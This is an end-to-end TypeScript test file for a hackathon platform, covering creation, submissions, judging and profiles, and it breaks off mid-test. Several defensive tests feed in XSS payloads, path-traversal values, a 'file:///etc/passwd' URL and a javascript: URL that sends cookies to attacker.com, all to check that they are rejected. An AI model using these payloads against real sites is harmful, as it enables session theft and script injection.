import test, { describe, before, after } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs/promises";
import path from "node:path";
import { neon } from "@neondatabase/serverless";
import { sanitizeUrl, formatInline } from "../src/lib/markdown-sanitize.ts";
import { isValidHttpUrl, getSafeExternalUrl } from "../src/lib/url-validation.ts";
import { safeJsonLdReplacer } from "../src/lib/json-ld.ts";

const BASE_URL = process.env.TEST_BASE_URL || "http://localhost:3000";
const sql = neon(process.env.DATABASE_URL!);

// Tokens for different actors
const ADMIN_TOKEN = "e2e_full_admin_tok_" + Date.now();
const BUILDER_TOKEN = "e2e_full_builder_tok_" + Date.now();
const JUDGE_TOKEN = "e2e_full_judge_tok_" + Date.now();
const RIVAL_TOKEN = "e2e_full_rival_tok_" + Date.now();
const ORGANIZER_TOKEN = "e2e_full_organizer_tok_" + Date.now();

let adminId = "";
let builderId = "";
let judgeId = "";
let rivalId = "";
let organizerId = "";
let builderEmail = "";

let hackathonId = "";
let hackathonSlug = "";
let submissionId = "";

async function api(
  path: string,
  options: {
    method?: "GET" | "POST" | "PATCH" | "DELETE";
    token?: string | null;
    body?: Record<string, unknown>;
    headers?: Record<string, string>;
  } = {}
) {
  const { method = "GET", token = null, body, headers: customHeaders = {} } = options;
  const headers: Record<string, string> = {
    "Content-Type": "application/json",
    ...customHeaders,
  };
  if (token) {
    headers["Cookie"] = `neon-auth.session_token=${token}`;
  }

  const res = await fetch(`${BASE_URL}${path}`, {
    method,
    headers,
    body: body ? JSON.stringify(body) : undefined,
  });

  let data: any = null;
  try {
    data = await res.json();
  } catch {
    // Some routes return HTML or empty bodies
  }

  return { status: res.status, ok: res.ok, data, headers: res.headers };
}

async function fetchHtml(path: string, token?: string | null) {
  const headers: Record<string, string> = {};
  if (token) {
    headers["Cookie"] = `neon-auth.session_token=${token}`;
  }
  const res = await fetch(`${BASE_URL}${path}`, { headers });
  const text = await res.text();
  return { status: res.status, ok: res.ok, text };
}

async function createActor(role: string, name: string, email: string) {
  const id = crypto.randomUUID();
  const username = `u_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`;
  await sql`
    INSERT INTO neon_auth.user (id, name, email, "emailVerified", role, "createdAt", "updatedAt")
    VALUES (${id}::uuid, ${name}, ${email}, true, ${role}, NOW(), NOW())
    ON CONFLICT (email) DO UPDATE SET role = EXCLUDED.role
    RETURNING id;
  `;
  await sql`
    INSERT INTO public.users (id, name, username, email, email_verified, role, created_at, updated_at)
    VALUES (${id}, ${name}, ${role === "user" ? null : username}, ${email}, true, ${role}, NOW(), NOW())
    ON CONFLICT (id) DO UPDATE SET role = EXCLUDED.role, username = COALESCE(EXCLUDED.username, public.users.username);
  `;
  return id;
}

before(async () => {
  const expiresAt = new Date(Date.now() + 24 * 60 * 60 * 1000);

  builderEmail = `builder_${Date.now()}@platform.io`;
  adminId = await createActor("admin", "Admin Master", `admin_${Date.now()}@platform.io`);
  builderId = await createActor("user", "Lead Hacker", builderEmail);
  judgeId = await createActor("judge", "Senior Judge", `judge_${Date.now()}@platform.io`);
  rivalId = await createActor("user", "Rival Dev", `rival_${Date.now()}@platform.io`);
  organizerId = await createActor("organizer", "Global Event Host", `organizer_${Date.now()}@platform.io`);

  // Create active sessions in neon_auth.session
  await sql`
    INSERT INTO neon_auth.session (id, "userId", token, "expiresAt", "createdAt", "updatedAt")
    VALUES 
      (${crypto.randomUUID()}::uuid, ${adminId}::uuid, ${ADMIN_TOKEN}, ${expiresAt}, NOW(), NOW()),
      (${crypto.randomUUID()}::uuid, ${builderId}::uuid, ${BUILDER_TOKEN}, ${expiresAt}, NOW(), NOW()),
      (${crypto.randomUUID()}::uuid, ${judgeId}::uuid, ${JUDGE_TOKEN}, ${expiresAt}, NOW(), NOW()),
      (${crypto.randomUUID()}::uuid, ${rivalId}::uuid, ${RIVAL_TOKEN}, ${expiresAt}, NOW(), NOW()),
      (${crypto.randomUUID()}::uuid, ${organizerId}::uuid, ${ORGANIZER_TOKEN}, ${expiresAt}, NOW(), NOW())
    ON CONFLICT (token) DO NOTHING;
  `;
});

after(async () => {
  if (submissionId) {
    await sql`DELETE FROM public.project_evaluations WHERE submission_id = ${submissionId}::uuid`;
    await sql`DELETE FROM public.hackathon_submissions WHERE id = ${submissionId}::uuid`;
  }
  if (hackathonId) {
    await sql`DELETE FROM public.hackathon_registrations WHERE hackathon_id = ${hackathonId}::uuid`;
    await sql`DELETE FROM public.hackathons WHERE id = ${hackathonId}::uuid`;
  }
  await sql`DELETE FROM neon_auth.session WHERE token IN (${ADMIN_TOKEN}, ${BUILDER_TOKEN}, ${JUDGE_TOKEN}, ${RIVAL_TOKEN}, ${ORGANIZER_TOKEN})`;
  if (adminId && builderId && judgeId && rivalId && organizerId) {
    await sql`DELETE FROM public.users WHERE id IN (${adminId}, ${builderId}, ${judgeId}, ${rivalId}, ${organizerId})`;
    await sql`DELETE FROM neon_auth.user WHERE id IN (${adminId}::uuid, ${builderId}::uuid, ${judgeId}::uuid, ${rivalId}::uuid, ${organizerId}::uuid)`;
  }
});

describe("A. Hackathon Creation with Prizes & Competition Rules", () => {
  test("Admin creates hackathon with cash, non-cash prizes and rules", async () => {
    hackathonSlug = `e2e-hackathon-${Date.now()}`;
    const payload = {
      title: "Global NextGen Autonomous Sprint 2026",
      slug: hackathonSlug,
      tagline: "Ship autonomous agent swarms and win top tier awards",
      description: "A premier international competitive challenge for systems engineers and AI developers.",
      prize_pool: "₹2,50,000 + Devices",
      currency: "₹",
      format: "online",
      location: "Worldwide / Virtual",
      prizes: [
        {
          id: "tier_1",
          type: "cash",
          title: "1st Place (Grand Prize)",
          amount: "150000",
          description: "Top overall scoring project across all criteria",
        },
        {
          id: "tier_2",
          type: "non-cash",
          title: "2nd Place (Runner-Up)",
          amount: "120000",
          item_name: "Apple iPhone 16 Pro (256GB)",
          description: "Brand new sealed flagship phone shipped worldwide",
        },
        {
          id: "tier_3",
          type: "cash",
          title: "Best Autonomous AI Agent",
          amount: "40000",
          description: "Specialized award for autonomous agent architecture",
        },
      ],
      rules: [
        "All code must be written during the active sprint window.",
        "Teams can consist of 1 to 4 verified participants.",
        "Open source dependencies and models are encouraged.",
        "Projects must provide a working interactive demo and source repo.",
      ],
      tags: ["AI", "Agents", "Next.js", "Fullstack"],
      start_date: new Date(Date.now() - 3600 * 1000).toISOString(),
      end_date: new Date(Date.now() + 86400 * 7 * 1000).toISOString(),
      submission_deadline: new Date(Date.now() + 86400 * 6 * 1000).toISOString(),
      max_team_size: 4,
      status: "published",
    };

    const res = await api("/api/admin/hackathons", {
      method: "POST",
      token: ADMIN_TOKEN,
      body: payload,
    });

    assert.equal(res.status, 201);
    assert.equal(res.data?.success, true);
    assert.ok(res.data?.hackathon?.id);
    hackathonId = res.data.hackathon.id;

    // Verify prizes and rules are stored and returned
    assert.equal(res.data.hackathon.prizes.length, 3);
    assert.equal(res.data.hackathon.rules.length, 4);
    assert.equal(res.data.hackathon.prizes[0].title, "1st Place (Grand Prize)");
    assert.equal(res.data.hackathon.prizes[1].item_name, "Apple iPhone 16 Pro (256GB)");
  });

  test("Judging API loads hackathon prizes with correct pricing and details", async () => {
    const res = await api(`/api/admin/judging?hackathonId=${hackathonId}`, {
      token: ADMIN_TOKEN,
    });

    assert.equal(res.status, 200);
    assert.equal(res.data?.success, true);
    assert.ok(Array.isArray(res.data?.hackathons));

    const foundHackathon = res.data.hackathons.find((h: any) => h.id === hackathonId);
    assert.ok(foundHackathon);
    assert.equal(foundHackathon.currency, "₹");
    assert.equal(foundHackathon.prizes.length, 3);
    assert.equal(foundHackathon.prizes[0].amount, "150000");
    assert.equal(foundHackathon.prizes[1].item_name, "Apple iPhone 16 Pro (256GB)");
  });

  test("Public Hackathon page renders rules and Schema.org Event JSON-LD", async () => {
    const res = await fetchHtml(`/hackathons/${hackathonSlug}`);
    assert.equal(res.status, 200);

    // Check rules content
    assert.match(res.text, /All code must be written during the active sprint window/);
    assert.match(res.text, /Teams can consist of 1 to 4 verified participants/);

    // Check JSON-LD
    assert.match(res.text, /application\/ld\+json/);
    assert.match(res.text, /"@type":"Event"/);
    assert.match(res.text, /Global NextGen Autonomous Sprint 2026/);
  });
});

describe("B. Project Submission & Direct Details Page Rendering", () => {
  test("Builder registers and submits a project", async () => {
    // Register
    const regRes = await api(`/api/hackathons/${hackathonSlug}/register`, {
      method: "POST",
      token: BUILDER_TOKEN,
      body: { participation_type: "individual" },
    });
    assert.equal(regRes.status, 200);
    assert.equal(regRes.data?.registered, true);

    // Submit project
    const subRes = await api(`/api/hackathons/${hackathonSlug}/submissions`, {
      method: "POST",
      token: BUILDER_TOKEN,
      body: {
        title: "Autonomous Agent Fleet",
        tagline: "High-performance autonomous swarm coordinator",
        description: "## Architecture Overview\nBuilt with Next.js, WebSockets, and Neon Postgres.\n\n### Highlights\n- Distributed execution\n- Real-time consensus",
        demo_url: "https://agent-fleet.demo.do4win.com",
        github_url: "https://github.com/do4win-builds/agent-fleet",
        video_url: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
        tech_stack: ["TypeScript", "Next.js", "PostgreSQL", "Docker"],
        cover_image: "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=800",
      },
    });

    assert.equal(subRes.status, 200);
    assert.equal(subRes.data?.success, true);
    assert.ok(subRes.data?.submission?.id);
    submissionId = subRes.data.submission.id;
  });

  test("Direct Project Details page (/projects/[id]) renders cleanly with Schema.org", async () => {
    const res = await fetchHtml(`/projects/${submissionId}`);
    assert.equal(res.status, 200);

    // Verify title, tagline, tech stack and description render
    assert.match(res.text, /Autonomous Agent Fleet/);
    assert.match(res.text, /High-performance autonomous swarm coordinator/);
    assert.match(res.text, /Architecture Overview/);
    assert.match(res.text, /Next\.js/);

    // Verify Schema.org SoftwareApplication JSON-LD is embedded
    assert.match(res.text, /application\/ld\+json/);
    assert.match(res.text, /"@type":"SoftwareApplication"/);
  });
});

describe("C. Judging & Winner Award Assignment with Pricing", () => {
  test("Judge awards project with 1st Place cash prize tier and pricing", async () => {
    const awardBadge = "🥇 1st Place (Grand Prize) · ₹1,50,000";

    const res = await api("/api/admin/judging", {
      method: "POST",
      token: JUDGE_TOKEN,
      body: {
        submission_id: submissionId,
        hackathon_id: hackathonId,
        score_innovation: 10,
        score_technical: 10,
        score_design: 9,
        score_impact: 10,
        score_presentation: 9,
        feedback: "Outstanding architecture, clear pitch video, and clean production implementation!",
        award: awardBadge,
      },
    });

    assert.equal(res.status, 200);
    assert.equal(res.data?.success, true);
    assert.equal(res.data?.evaluation?.award, awardBadge);
    assert.equal(res.data?.evaluation?.total_score, 48);

    // Verify in database and judging leaderboard
    const boardRes = await api(`/api/admin/judging?hackathonId=${hackathonId}`, {
      token: JUDGE_TOKEN,
    });
    assert.equal(boardRes.status, 200);

    const scoredSub = boardRes.data.submissions.find((s: any) => s.id === submissionId);
    assert.ok(scoredSub);
    assert.equal(scoredSub.total_score, 48);
    assert.equal(scoredSub.winner_badge, awardBadge);
    assert.equal(scoredSub.is_featured, true);
  });

  test("Judge can re-award with a non-cash hardware tier", async () => {
    const nonCashBadge = "🥈 2nd Place (Runner-Up) · Apple iPhone 16 Pro (256GB)";

    const res = await api("/api/admin/judging", {
      method: "POST",
      token: JUDGE_TOKEN,
      body: {
        submission_id: submissionId,
        hackathon_id: hackathonId,
        score_innovation: 9,
        score_technical: 9,
        score_design: 9,
        score_impact: 9,
        score_presentation: 9,
        feedback: "Updated evaluation after second jury round.",
        award: nonCashBadge,
      },
    });

    assert.equal(res.status, 200);
    assert.equal(res.data?.evaluation?.award, nonCashBadge);

    const boardRes = await api(`/api/admin/judging?hackathonId=${hackathonId}`, {
      token: JUDGE_TOKEN,
    });
    const scoredSub = boardRes.data.submissions.find((s: any) => s.id === submissionId);
    assert.equal(scoredSub.winner_badge, nonCashBadge);
  });

  test("Judge can clear award badge and verify winner_badge becomes null", async () => {
    const res = await api("/api/admin/judging", {
      method: "POST",
      token: JUDGE_TOKEN,
      body: {
        submission_id: submissionId,
        hackathon_id: hackathonId,
        score_innovation: 9,
        score_technical: 9,
        score_design: 9,
        score_impact: 9,
        score_presentation: 9,
        feedback: "Score recorded without placement award.",
        award: null,
      },
    });

    assert.equal(res.status, 200);
    assert.equal(res.data?.evaluation?.award, null);

    // Verify in database
    const subRows = await sql`
      SELECT winner_badge FROM public.hackathon_submissions WHERE id = ${submissionId}::uuid
    `;
    assert.equal(subRows[0].winner_badge, null);
  });

  test("Judge can assign a special track distinction badge", async () => {
    const trackBadge = "🤖 Best AI / ML Innovation";

    const res = await api("/api/admin/judging", {
      method: "POST",
      token: JUDGE_TOKEN,
      body: {
        submission_id: submissionId,
        hackathon_id: hackathonId,
        score_innovation: 10,
        score_technical: 9,
        score_design: 9,
        score_impact: 9,
        score_presentation: 9,
        award: trackBadge,
      },
    });

    assert.equal(res.status, 200);
    assert.equal(res.data?.evaluation?.award, trackBadge);

    const subRows = await sql`
      SELECT winner_badge FROM public.hackathon_submissions WHERE id = ${submissionId}::uuid
    `;
    assert.equal(subRows[0].winner_badge, trackBadge);
  });
});

describe("D. Admin Projects Management & Moderation", () => {
  test("Admin can moderate status and winner badge directly via API", async () => {
    const res = await api(`/api/admin/projects/${submissionId}`, {
      method: "PATCH",
      token: ADMIN_TOKEN,
      body: {
        status: "under_review",
        is_featured: false,
        winner_badge: "🏆 Community Favorite",
      },
    });

    assert.equal(res.status, 200);
    assert.equal(res.data?.project?.status, "under_review");
    assert.equal(res.data?.project?.is_featured, false);
    assert.equal(res.data?.project?.winner_badge, "🏆 Community Favorite");
  });

  test("Admin can approve project and feature it on landing page", async () => {
    const res = await api(`/api/admin/projects/${submissionId}`, {
      method: "PATCH",
      token: ADMIN_TOKEN,
      body: {
        status: "approved",
        is_featured: true,
      },
    });

    assert.equal(res.status, 200);
    assert.equal(res.data?.project?.status, "approved");
    assert.equal(res.data?.project?.is_featured, true);
  });
});

describe("E. User Unique Username Claiming & Profile Onboarding", () => {
  const uniqueCandidate = `hacker_${Date.now()}`;

  test("Check-username returns available for valid non-existent username", async () => {
    const res = await api(`/api/user/username?username=${uniqueCandidate}`);
    assert.equal(res.status, 200);
    assert.equal(res.data?.available, true);
  });

  test("Check-username rejects reserved names like 'admin' and 'support'", async () => {
    const res1 = await api("/api/user/username?username=admin");
    assert.equal(res1.status, 200);
    assert.equal(res1.data?.available, false);
    assert.match(res1.data?.reason, /reserved/i);

    const res2 = await api("/api/user/username?username=support");
    assert.equal(res2.status, 200);
    assert.equal(res2.data?.available, false);
  });

  test("Check-username rejects invalid formats (spaces, special characters, length limits)", async () => {
    const shortRes = await api("/api/user/username?username=ab");
    assert.equal(shortRes.status, 200);
    assert.equal(shortRes.data?.available, false);
    assert.match(shortRes.data?.reason, /at least 3 characters/i);

    const specialRes = await api("/api/user/username?username=cool%20guy!");
    assert.equal(specialRes.status, 200);
    assert.equal(specialRes.data?.available, false);
  });

  test("Builder can claim unique username via POST /api/user/username", async () => {
    const res = await api("/api/user/username", {
      method: "POST",
      token: BUILDER_TOKEN,
      body: { username: uniqueCandidate, name: "Lead Hacker Pro" },
    });

    assert.equal(res.status, 200);
    assert.equal(res.data?.success, true);
    assert.equal(res.data?.user?.username, uniqueCandidate);
  });

  test("Claimed username is no longer available to other users", async () => {
    const res = await api(`/api/user/username?username=${uniqueCandidate}`);
    assert.equal(res.status, 200);
    assert.equal(res.data?.available, false);
    assert.match(res.data?.reason, /already taken/i);
  });

  test("Rival user attempting to claim the taken username receives 400 error", async () => {
    const res = await api("/api/user/username", {
      method: "POST",
      token: RIVAL_TOKEN,
      body: { username: uniqueCandidate },
    });

    assert.equal(res.status, 400);
    assert.match(res.data?.error, /already taken/i);
  });

  test("Builder can update profile and change to another unique username", async () => {
    const secondCandidate = `lead_dev_${Date.now()}`;
    const res = await api("/api/user/profile", {
      method: "PATCH",
      token: BUILDER_TOKEN,
      body: {
        username: secondCandidate,
        bio: "Specializing in autonomous agent architectures",
        github_username: "lead-hacker-pro",
        skills: ["TypeScript", "Next.js", "Python"],
      },
    });

    assert.equal(res.status, 200);
    assert.equal(res.data?.profile?.username, secondCandidate);
    assert.equal(res.data?.profile?.github_username, "lead-hacker-pro");
  });
});

describe("F. SEO, Sitemap, Robots, and Discovery Feeds", () => {
  test("GET /robots.txt disallows admin and private routes, exposes sitemap", async () => {
    const res = await fetchHtml("/robots.txt");
    assert.equal(res.status, 200);
    assert.match(res.text, /User-Agent: \*/);
    assert.match(res.text, /Disallow: \/admin/);
    assert.match(res.text, /Disallow: \/api/);
    assert.match(res.text, /Disallow: \/auth/);
    assert.match(res.text, /Disallow: \/profile/);
    assert.match(res.text, /Sitemap: http:\/\/localhost:3000\/sitemap\.xml/);
  });

  test("GET /sitemap.xml returns valid XML sitemap indexing routes", async () => {
    const res = await fetchHtml("/sitemap.xml");
    assert.equal(res.status, 200);
    assert.match(res.text, /<\?xml/);
    assert.match(res.text, /<urlset/);
    assert.match(res.text, /<loc>http:\/\/localhost:3000<\/loc>/);
    assert.match(res.text, /<loc>http:\/\/localhost:3000\/hackathons<\/loc>/);
  });

  test("GET /manifest.webmanifest returns valid PWA manifest", async () => {
    const res = await fetchHtml("/manifest.webmanifest");
    assert.equal(res.status, 200);
    const manifest = JSON.parse(res.text);
    assert.equal(manifest.short_name, "Hack4Win");
    assert.equal(manifest.start_url, "/");
  });

  test("GET / returns Schema.org WebSite & Organization structured data", async () => {
    const res = await fetchHtml("/");
    assert.equal(res.status, 200);
    assert.match(res.text, /application\/ld\+json/);
    assert.match(res.text, /"@type":"WebSite"/);
    assert.match(res.text, /"@type":"Organization"/);
  });

  test("GET /hackathons returns Schema.org ItemList structured data", async () => {
    const res = await fetchHtml("/hackathons");
    assert.equal(res.status, 200);
    assert.match(res.text, /application\/ld\+json/);
    assert.match(res.text, /"@type":"ItemList"/);
  });
});

describe("G. Participant Capacity Limit & Progress Tracking Workflow", () => {
  let capacityHackathonId = "";
  let capacityHackathonSlug = "";

  test("Admin can create a hackathon with participant limit (e.g. max_participants = 2)", async () => {
    const slug = `capacity-test-${Date.now()}`;
    const res = await api("/api/admin/hackathons", {
      method: "POST",
      token: ADMIN_TOKEN,
      body: {
        title: "Exclusive Capacity Sprint",
        slug,
        tagline: "Limited seats competition",
        description: "Only 2 participants allowed.",
        format: "online",
        location: "Global (Online)",
        start_date: new Date(Date.now() + 86400000 * 2).toISOString(),
        end_date: new Date(Date.now() + 86400000 * 10).toISOString(),
        submission_deadline: new Date(Date.now() + 86400000 * 9).toISOString(),
        max_team_size: 2,
        max_participants: 2,
        status: "published",
      },
    });

    assert.equal(res.status, 201);
    assert.equal(res.data?.success, true);
    assert.equal(res.data?.hackathon?.max_participants, 2);
    capacityHackathonId = res.data.hackathon.id;
    capacityHackathonSlug = res.data.hackathon.slug;
  });

  test("First participant registers successfully (1/2 filled)", async () => {
    const res = await api(`/api/hackathons/${capacityHackathonSlug}/register`, {
      method: "POST",
      token: BUILDER_TOKEN,
      body: { participation_type: "solo" },
    });

    assert.equal(res.status, 200);
    assert.equal(res.data?.registered, true);
    assert.equal(res.data?.count, 1);
  });

  test("Second participant registers successfully (2/2 filled, at capacity)", async () => {
    const res = await api(`/api/hackathons/${capacityHackathonSlug}/register`, {
      method: "POST",
      token: RIVAL_TOKEN,
      body: { participation_type: "solo" },
    });

    assert.equal(res.status, 200);
    assert.equal(res.data?.registered, true);
    assert.equal(res.data?.count, 2);
  });

  test("Third user attempting to register is rejected because capacity is full", async () => {
    const res = await api(`/api/hackathons/${capacityHackathonSlug}/register`, {
      method: "POST",
      token: JUDGE_TOKEN,
      body: { participation_type: "solo" },
    });

    assert.equal(res.status, 400);
    assert.match(res.data?.error, /maximum participant limit/i);
  });

  test("Admin can edit hackathon to remove limit (set to unlimited)", async () => {
    const res = await api(`/api/admin/hackathons/${capacityHackathonId}`, {
      method: "PATCH",
      token: ADMIN_TOKEN,
      body: {
        max_participants: null,
      },
    });

    assert.equal(res.status, 200);
    assert.equal(res.data?.success, true);
    assert.equal(res.data?.hackathon?.max_participants, null);
  });

  test("Third user can now register successfully after limit is removed", async () => {
    const res = await api(`/api/hackathons/${capacityHackathonSlug}/register`, {
      method: "POST",
      token: JUDGE_TOKEN,
      body: { participation_type: "solo" },
    });

    assert.equal(res.status, 200);
    assert.equal(res.data?.registered, true);
    assert.equal(res.data?.count, 3);
  });

  after(async () => {
    if (capacityHackathonId) {
      await sql`DELETE FROM public.hackathons WHERE id = ${capacityHackathonId}::uuid;`;
    }
  });
});

describe("H. Stored Cross-Site Scripting (XSS) Prevention in Markdown Preview", () => {
  test("Neutralizes javascript: URI schemes in markdown links", () => {
    const malicious = "[Click to see live demo](javascript:alert(document.cookie))";
    const formatted = formatInline(malicious);
    
    assert.ok(
      formatted.includes('href="#"'),
      `Expected href="#" but got: ${formatted}`
    );
    assert.ok(
      !formatted.includes("javascript:"),
      `Did not expect javascript: in rendered HTML: ${formatted}`
    );
  });

  test("Neutralizes data: and vbscript: URIs", () => {
    assert.equal(sanitizeUrl("data:text/html,<script>alert(1)</script>"), "#");
    assert.equal(sanitizeUrl("vbscript:msgbox(1)"), "#");
    assert.equal(sanitizeUrl("  javascript:void(0) "), "#");
  });

  test("Escapes double quotes and prevents attribute breakout in markdown links", () => {
    const breakout = '[Click here](https://example.com" onmouseover="alert(1))';
    const formatted = formatInline(breakout);

    // Ensure double quotes are escaped as &quot;
    assert.ok(
      formatted.includes("&quot;"),
      `Expected quotes escaped to &quot; in ${formatted}`
    );
    // Ensure there is no active onmouseover attribute breakout
    assert.ok(
      !formatted.includes('onmouseover="'),
      `Found dangerous attribute breakout: ${formatted}`
    );
  });

  test("Allows safe HTTP, HTTPS, relative paths, and anchor hashes", () => {
    assert.equal(
      sanitizeUrl("https://github.com/org/repo"),
      "https://github.com/org/repo"
    );
    assert.equal(
      sanitizeUrl("http://example.com/demo"),
      "http://example.com/demo"
    );
    assert.equal(
      sanitizeUrl("/hackathons/hackathon-2026"),
      "/hackathons/hackathon-2026"
    );
    assert.equal(sanitizeUrl("#rules-and-criteria"), "#rules-and-criteria");
  });

  test("Handles optional angle brackets around URLs properly", () => {
    const markdown = "[Safe Site](<https://example.com/docs>)";
    const formatted = formatInline(markdown);
    assert.ok(
      formatted.includes('href="https://example.com/docs"'),
      `Expected valid href but got: ${formatted}`
    );
  });
});

describe("I. URL Validation & javascript: URI Stored XSS Prevention in Action Links", () => {
  test("isValidHttpUrl accepts valid http and https URLs and rejects dangerous URI schemes", () => {
    assert.equal(isValidHttpUrl("https://example.com"), true);
    assert.equal(isValidHttpUrl("http://insecure.org/path"), true);
    assert.equal(isValidHttpUrl(null), true);
    assert.equal(isValidHttpUrl(undefined), true);
    assert.equal(isValidHttpUrl(""), true);

    assert.equal(isValidHttpUrl("javascript:alert(document.cookie)"), false);
    assert.equal(isValidHttpUrl("data:text/html,<script>alert(1)</script>"), false);
    assert.equal(isValidHttpUrl("vbscript:msgbox(1)"), false);
    assert.equal(isValidHttpUrl("file:///etc/passwd"), false);
    assert.equal(isValidHttpUrl("blob:https://example.com/uuid"), false);
  });

  test("getSafeExternalUrl only returns valid http/https URLs and strips malicious schemes", () => {
    assert.equal(getSafeExternalUrl("https://github.com/my-org/repo"), "https://github.com/my-org/repo");
    assert.equal(getSafeExternalUrl("http://demo.example.com"), "http://demo.example.com");

    assert.equal(getSafeExternalUrl("javascript:alert(1)"), undefined);
    assert.equal(getSafeExternalUrl("data:text/html,test"), undefined);
    assert.equal(getSafeExternalUrl(null), undefined);
    assert.equal(getSafeExternalUrl(undefined), undefined);
  });

  test("POST /api/hackathons/[slug]/submissions rejects submission with javascript: demo_url", async () => {
    const res = await api(`/api/hackathons/${hackathonSlug}/submissions`, {
      method: "POST",
      token: BUILDER_TOKEN,
      body: {
        title: "Malicious XSS Project Demo",
        description: "Testing javascript URI scheme rejection",
        demo_url: "javascript:alert(document.cookie)",
      },
    });

    assert.equal(res.status, 400);
    assert.match(res.data?.error, /URLs must start with http:\/\/ or https:\/\//i);
  });

  test("POST /api/hackathons/[slug]/submissions rejects submission with javascript: github_url", async () => {
    const res = await api(`/api/hackathons/${hackathonSlug}/submissions`, {
      method: "POST",
      token: BUILDER_TOKEN,
      body: {
        title: "Malicious XSS Project GitHub",
        description: "Testing javascript URI scheme rejection",
        github_url: "javascript:evil()",
      },
    });

    assert.equal(res.status, 400);
    assert.match(res.data?.error, /URLs must start with http:\/\/ or https:\/\//i);
  });

  test("PATCH /api/user/profile rejects profile update with javascript: website", async () => {
    const res = await api("/api/user/profile", {
      method: "PATCH",
      token: BUILDER_TOKEN,
      body: {
        website: "javascript:alert(localStorage.getItem('token'))",
      },
    });

    assert.equal(res.status, 400);
    assert.match(res.data?.error, /URLs must start with http:\/\/ or https:\/\//i);
  });

  test("PATCH /api/admin/projects/[id] rejects updating project with javascript: URLs", async () => {
    const res = await api(`/api/admin/projects/${submissionId}`, {
      method: "PATCH",
      token: ADMIN_TOKEN,
      body: {
        demo_url: "javascript:window.location='http://attacker.com?cookie='+document.cookie",
      },
    });

    assert.equal(res.status, 400);
    assert.match(res.data?.error, /URLs must start with http:\/\/ or https:\/\//i);
  });
});

describe("J. JSON-LD <script> Injection Prevention via safeJsonLdReplacer", () => {
  test("Escapes < to unicode \\u003c to prevent early script block termination", () => {
    const maliciousPayload = {
      "@context": "https://schema.org",
      "@type": "SoftwareApplication",
      "name": "SuperApp</script><script>alert(document.domain)</script>",
      "description": "User bio with <img src=x onerror=alert(1)> and </script>",
    };

    const serialized = safeJsonLdReplacer(maliciousPayload);

    // Must not contain any literal unescaped '<'
    assert.equal(serialized.includes("<"), false, `Serialized JSON-LD contains raw '<': ${serialized}`);
    assert.ok(serialized.includes("\\u003c/script>"), `Expected \\u003c/script> in: ${serialized}`);
    assert.ok(serialized.includes("\\u003cscript>"), `Expected \\u003cscript> in: ${serialized}`);

    // Must still parse cleanly as identical JSON
    const parsed = JSON.parse(serialized);
    assert.equal(parsed.name, maliciousPayload.name);
    assert.equal(parsed.description, maliciousPayload.description);
  });

  test("Project page /projects/[id] renders safe JSON-LD without unescaped script termination", async () => {
    // Update submission tagline with potential breakout
    await api(`/api/admin/projects/${submissionId}`, {
      method: "PATCH",
      token: ADMIN_TOKEN,
      body: {
        tagline: "Breakout Test </script><script>alert('pwned')</script>",
      },
    });

    const res = await fetch(`${BASE_URL}/projects/${submissionId}`);
    assert.equal(res.status, 200);
    const html = await res.text();

    // Ensure the JSON-LD script contains unicode escaping instead of raw '</script><script>'
    const jsonLdBlockMatch = html.match(/<script type="application\/ld\+json">([\s\S]*?)<\/script>/);
    assert.ok(jsonLdBlockMatch, "JSON-LD script tag not found in page HTML");

    const jsonLdContent = jsonLdBlockMatch[1];
    assert.ok(!jsonLdContent.includes("</script>"), `Found premature </script> inside JSON-LD payload: ${jsonLdContent}`);
    assert.ok(jsonLdContent.includes("\\u003c/script>"), `Expected unicode \\u003c/script> in: ${jsonLdContent}`);
  });
});

describe("K. S3 Upload Hardening, SVG XSS Prevention & Folder Allowlist", () => {
  test("POST /api/upload rejects unauthenticated upload requests with 401", async () => {
    const formData = new FormData();
    formData.append("file", new Blob(["fake png"], { type: "image/png" }), "test.png");

    const res = await fetch(`${BASE_URL}/api/upload`, {
      method: "POST",
      body: formData,
    });
    assert.equal(res.status, 401);
  });

  test("POST /api/upload rejects image/svg+xml files with 400", async () => {
    const formData = new FormData();
    formData.append(
      "file",
      new Blob(['<svg><script>alert("xss")</script></svg>'], { type: "image/svg+xml" }),
      "vector.svg"
    );

    const res = await fetch(`${BASE_URL}/api/upload`, {
      method: "POST",
      headers: {
        Cookie: `neon-auth.session_token=${BUILDER_TOKEN}`,
      },
      body: formData,
    });

    assert.equal(res.status, 400);
    const data = (await res.json()) as { error: string };
    assert.match(data.error, /Only JPEG, PNG, WEBP, and GIF images are allowed/i);
  });

  test("POST /api/upload rejects path traversal in folder parameter with 400", async () => {
    const formData = new FormData();
    formData.append("file", new Blob(["fake png"], { type: "image/png" }), "test.png");
    formData.append("folder", "../../../evil");

    const res = await fetch(`${BASE_URL}/api/upload`, {
      method: "POST",
      headers: {
        Cookie: `neon-auth.session_token=${BUILDER_TOKEN}`,
      },
      body: formData,
    });

    assert.equal(res.status, 400);
    const data = (await res.json()) as { error: string };
    assert.match(data.error, /Invalid target folder/i);
  });

  test("POST /api/upload rejects disguised SVG payload masquerading as image/png", async () => {
    const formData = new FormData();
    formData.append(
      "file",
      new Blob(['<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'], {
        type: "image/png",
      }),
      "evil.png"
    );

    const res = await fetch(`${BASE_URL}/api/upload`, {
      method: "POST",
      headers: {
        Cookie: `neon-auth.session_token=${BUILDER_TOKEN}`,
      },
      body: formData,
    });

    assert.equal(res.status, 400);
    const data = (await res.json()) as { error: string };
    assert.match(data.error, /Only JPEG, PNG, WEBP, and GIF images are allowed/i);
  });
});

describe("L. Team Invitations Mass Account Creation Abuse Prevention & Email Linking", () => {
  const prospectiveEmail = `prospective_builder_${Date.now()}@example.com`;
  const PROSPECTIVE_TOKEN = "e2e_prospective_tok_" + Date.now();
  let pendingInviteId = "";
  let prospectiveUserId = "";

  test("Sending invite by email does NOT provision users in public.users or neon_auth.user", async () => {
    const res = await api("/api/team-invites", {
      method: "POST",
      token: BUILDER_TOKEN,
      body: {
        hackathon_id: hackathonId,
        receiver_email: prospectiveEmail,
        team_name: "Anti-Abuse Fleet",
        role: "Systems Specialist",
        message: "Join my team when you sign up!",
      },
    });

    assert.equal(res.status, 200);
    assert.equal(res.data?.success, true);
    assert.ok(res.data?.invitation?.id);
    pendingInviteId = res.data.invitation.id;

    // receiver_id must be null, receiver_email must match
